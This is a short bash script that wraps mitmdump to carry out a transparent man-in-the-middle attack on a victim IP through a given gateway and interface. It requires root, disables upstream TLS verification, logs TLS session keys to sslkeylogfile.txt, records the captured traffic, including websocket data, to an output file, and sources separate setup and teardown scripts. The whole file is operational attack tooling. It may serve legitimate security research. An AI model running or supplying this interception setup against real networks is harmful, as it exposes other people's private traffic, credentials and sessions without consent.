#!/bin/bash

# make sure we're running as root
if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root."
   exit 1
fi

# give command-line arguments meaningful names
INTERFACE=$1
VICTIM_IP=$2
GATEWAY_IP=$3
OUTFILE=$4

source setup.sh

# launch mitmdump
echo "[+] mitm'ing $VICTIM_IP on $INTERFACE"
SSLKEYLOGFILE="$PWD/sslkeylogfile.txt" ./mitmdump -s websocket_raw.py --ssl-insecure --mode transparent -w $OUTFILE -v --set ssl_version_client=all --set ssl_version_server=all

source teardown.sh
